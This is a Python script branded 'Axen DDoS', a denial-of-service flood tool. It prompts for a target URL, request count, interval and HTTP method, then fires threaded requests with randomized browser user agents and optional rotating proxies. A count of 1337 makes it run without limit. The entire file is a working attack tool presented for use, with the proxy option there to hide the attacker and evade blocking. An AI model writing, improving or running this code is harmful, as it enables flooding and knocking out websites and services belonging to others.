import requests
import threading
import random
import os
import time
from termcolor import colored

def star():
    os.system("cls")
    os.system("title Axen DDoS")
    skull = """                                     
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠾⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠀⣿⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀ 
⠀⠀⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⠀⣠⣽⣿⡿⠟⠃          \033[33m[\033[0m Axen & Settings\033[33m ]\033[31m
⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⣾⣿⠟⠋⠁⠀⠀⠀ 
⠀⣰⣿⣿⣾⣿⠿⢾⣷⣀⠀⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀ 
    """
    print(colored(skull, 'red'))

def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(user_agents)

def send(url, method, proxies):
    headers = {
        "User-Agent": random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }
    try:
        if method == "GET":
            response = requests.get(url, headers=headers, proxies=proxies)
        elif method == "POST":
            response = requests.post(url, headers=headers, data={'key': 'value'}, proxies=proxies)
        elif method == "PUT":
            response = requests.put(url, headers=headers, data={'key': 'value'}, proxies=proxies)
        elif method == "DELETE":
            response = requests.delete(url, headers=headers, proxies=proxies)
        else:
            print(colored(f"Invalid method: {method}", 'red'))
            return
        print(colored(f"[ + ] Sent attack to : {url} | Status Code : {response.status_code}", 'blue'))
    except Exception as e:
        print(colored(f"An error occurred: {e}", 'red'))

def opz(url, count, interval, method, proxy_list):
    print(colored(f"Launching {method} attack to {url}\n", 'blue'))

    i = 0
    while count == 1337 or i < count:
        try:
            proxy = random.choice(proxy_list) if proxy_list else None
            proxies = {"http": proxy, "https": proxy} if proxy else None
            threading.Thread(target=send, args=(url, method, proxies)).start()
            i += 1
            time.sleep(interval)
        except KeyboardInterrupt:
            print(colored("\nOperation has been cancelled by user.", 'yellow'))
            break

    print(colored("\n[ + ] Attacked has been finished.", 'green'))

if __name__ == "__main__":
    star()
    
    url = input(colored("┌═══[ url@Axen ]\n└═════► $: ", 'red'))
    packet_count = int(input(colored("┌═══[ request@Axen ]\n└═════► $: ", 'red')))
    interval = float(input(colored("┌═══[ interval@Axen ]\n└═════► $: ", 'red')))
    method = input(colored("┌═══[ post@Axen ]\n└═════► $: ", 'red')).upper()
    
    use_proxies = input(colored("┌═══[ proxy@Axen ~ [y\n] ]\n└═════► $: ", 'red')).lower() == 'yes'
    proxy_list = []
    
    if use_proxies:
        proxy_file = input(colored("┌═══[ path@aymen ]\n└═════► $: ", 'red'))
        try:
            with open(proxy_file, 'r') as file:
                proxy_list = [line.strip() for line in file.readlines()]
            print(colored(f"Loaded {len(proxy_list)} proxies.", 'green'))
        except FileNotFoundError:
            print(colored("Proxy file not found. Continuing without proxies.", 'red'))
            use_proxies = False
    
    opz(url, packet_count, interval, method, proxy_list)
